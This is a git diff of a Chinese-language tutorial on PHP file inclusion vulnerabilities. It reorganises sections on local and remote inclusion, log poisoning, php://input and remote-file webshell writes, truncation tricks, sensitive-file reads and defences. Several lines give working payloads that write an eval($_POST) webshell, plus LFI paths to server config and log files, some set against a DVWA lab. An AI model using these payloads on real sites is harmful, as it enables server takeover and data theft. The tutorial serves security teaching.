@@ -36,31 +36,26 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 ```
 
 ### 0x03 漏洞危害
-> ```
-执行任意代码
-包含恶意文件控制网站
-甚至控制服务器
-```
+* 执行任意代码
+* 读取文件源码或敏感信息
+* 包含恶意文件控制网站
+* 甚至控制服务器
 
 ### 0x04 漏洞分类
-> ```
-本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码
-    上传图片马，然后包含
-    读敏感文件，读PHP文件
-    包含日志文件GetShell
-    包含/proc/self/envion文件GetShell
-    包含data:或php://input等伪协议
-    若有phpinfo则可以包含临时文件
-远程文件包含：可以直接执行任意代码
-    要保证php.ini中allow_url_fopen和allow_url_include要为On
-```
+* 本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码
+    * 读敏感文件，读PHP文件
+    * 包含日志文件GetShell
+    * 上传图片马，然后包含从而GetShell
+    * 包含/proc/self/envion文件GetShell
+    * 包含data:或php://input等伪协议
+    * 若有phpinfo则可以包含临时文件
+* 远程文件包含：可以直接执行任意代码
+    * 要保证php.ini中allow_url_fopen和allow_url_include要为On
 
 ### 0x05 漏洞挖掘
-> ```
-上AWVS吧，骚年...
-```
+> 上AWVS或者自己写代码测试
 
-### 0x06 本地包含
+### 0x06 本地包含GetShell
 * 示例一
 
 > ```php
@@ -72,9 +67,9 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
     }
 ?>
 ```
-{{% fluid_img src="/img/post/file_include_upload1.png" alt="文件包含-上传图片马.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/file_include_upload1_check.png" alt="文件包含-验证能包含图片马.png" %}}
+![文件包含-上传图片马](/img/post/file_include_upload1.png)
+<br>
+![文件包含-验证能包含图片马](/img/post/file_include_upload1_check.png)
 
 * 示例二
 
@@ -87,9 +82,9 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
     }
 ?>
 ```
-{{% fluid_img src="/img/post/file_include_upload2.png" alt="文件包含-上传图片马.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/file_include_upload2_check.png" alt="文件包含-验证能包含图片马.png" %}}
+![文件包含-上传图片马](/img/post/file_include_upload2.png)
+<br />
+![文件包含-验证能包含图片马](/img/post/file_include_upload2_check.png)
 
 * %00截断包含(PHP<5.3.4 and magic_quotes_gpc=off)
 
@@ -103,13 +98,14 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
     }
 ?>
 ```
-{{% fluid_img src="/img/post/file_include_upload3.png" alt="文件包含-上传图片马.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/file_include_upload3_check.png" alt="文件包含-验证能包含图片马.png" %}}<br /><br />
+![文件包含-上传图片马](/img/post/file_include_upload3.png)
+<br />
+![文件包含-验证能包含图片马](/img/post/file_include_upload3_check.png)
+<br>
 还有一个路径长度截断，Linux可以用./或/截断，需要文件名长度大于4096，Windows可以  
 用\\.或./或\或/截断，需要大于256，是否能成功截断有多方面原因，可以说是靠运气的
 
-* 示例四
+* 包含图片马写shell
 
 > ```
 上传图片马，马包含的代码为<?fputs(fopen("shell.php","w"),"<?php eval($_POST[xxser]);?>")?>，
@@ -118,8 +114,53 @@ http://localhost/dvwa/vulnerabilities/fi/?page=../../uploadfile/201643.jpg时，
 将会在fi这个文件夹下生成shell.php,内容为<?php eval($_POST[xxser]);?>
 ```
 
+* 包含日志GetShell(主要是得到日志的路径)
+
+> ```
+读日志路径：
+文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+默认位置/var/log/httpd/access_log
+```
+> 日志会记录客户端请求及服务器响应的信息，访问```http://www.xx.com/<?php phpinfo(); ?>```时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent
+![文件包含-包含日志](/img/post/file_include_access.log1.png)
+可以通过Burp Suite来绕过编码
+![文件包含-包含日志](/img/post/file_include_access.log2.png)
+日志内容如下：
+![文件包含-包含日志](/img/post/file_include_access.log3.png)
+<br />
+![文件包含-包含日志](/img/post/file_include_access.log4.png)
+
+* 包含环境变量文件GetShell
+
+> ```
+需要PHP运行在CGI模式
+然后和包含日志一样，在User-Agent修改为payload
+```
+
+* 使用PHP封装协议GetShell
+
+> ```
+allow_url_include=On时,若执行http://www.xxx.com/index.php?page=php://input,并且提
+交数据<?php fputs(fopen("shell.php","w"),"<?php eval($_POST['xxxser']);?>") ?>
+结果将在index.php所在文件下生成一句话文件shell.php
+```
+![文件包含-用PHP封装协议写shell1](/img/post/file_include_enprotocol1.png)
+<br />
+![文件包含-用PHP封装协议写shell2](/img/post/file_include_enprotocol2.png)
+
+* phpinfo包含临时文件GetShell
+
+> ```
+向phpinfo上传文件则可以返回文件路径，但是文件存在时间很短，
+可以用程序持续上传，然后就可以包含你上传的文件了
+```
+
+### 0x07 本地包含读文件
 * 读敏感文件
-{{% fluid_img src="/img/post/file_include_read_file.png" alt="文件包含-读敏感文件.png" %}}
+
+> ![文件包含-读敏感文件](/img/post/file_include_read_file.png)
 可读如下敏感文件：
 
 > ```
@@ -148,7 +189,7 @@ Linux：
     /porc/config.gz
 ```
 
-* 读PHP文件
+* 读PHP文件源码
 
 > ```
 直接包含php文件时会被解析，不能看到源码，可以用封装协议读取：
@@ -156,55 +197,12 @@ Linux：
 访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码
 ```
 
-* 包含日志(主要是得到日志的路径)
-
-> ```
-读日志路径：
-文件包含漏洞读取apache配置文件
-index.php?page=/etc/init.d/httpd
-index.php?page=/etc/httpd/conf/httpd.conf
-默认位置/var/log/httpd/access_log
-```
-> 日志会记录客户端请求及服务器响应的信息，访问```http://www.xx.com/<?php phpinfo(); ?>```时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent
-{{% fluid_img src="/img/post/file_include_access.log1.png" alt="文件包含-包含日志.png" %}}
-可以通过Burp Suite来绕过编码
-{{% fluid_img src="/img/post/file_include_access.log2.png" alt="文件包含-包含日志.png" %}}
-日志内容如下：
-{{% fluid_img src="/img/post/file_include_access.log3.png" alt="文件包含-包含日志.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/file_include_access.log4.png" alt="文件包含-包含日志.png" %}}
-
-* 包含环境变量文件GetShell
-
-> ```
-需要PHP运行在CGI模式
-然后和包含日志一样，在User-Agent修改为payload
-```
-
-* 使用PHP封装协议
-
-> ```
-allow_url_include=On时,若执行http://www.xxx.com/index.php?page=php://input,并且提
-交数据<?php fputs(fopen("shell.php","w"),"<?php eval($_POST['xxxser']);?>") ?>
-结果将在index.php所在文件下生成一句话文件shell.php
-```
-{{% fluid_img src="/img/post/file_include_enprotocol1.png" alt="文件包含-用PHP封装协议写shell1.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/file_include_enprotocol2.png" alt="文件包含-用PHP封装协议写shell2.png" %}}
-
-* phpinfo包含临时文件
-
-> ```
-向phpinfo上传文件则可以返回文件路径，但是文件存在时间很短，
-可以用程序持续上传，然后就可以包含你上传的文件了
-```
-
-### 0x07 远程包含
+### 0x08 远程包含
 > 注：远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的
-{{% fluid_img src="/img/post/file_include_remote_include.png" alt="文件包含-远程包含.png" %}}
+![文件包含-远程包含](/img/post/file_include_remote_include.png)
 若在a.txt写入<?php fputs(fopen("shell.php","w"),"<?php @eval($_POST[xxx]); ?>") ?>，可直接写shell
 
-### 0x08 漏洞防御
+### 0x09 漏洞防御
 > ```
 PHP中使用open_basedir配置，将访问限制在指定区域
 过滤./\
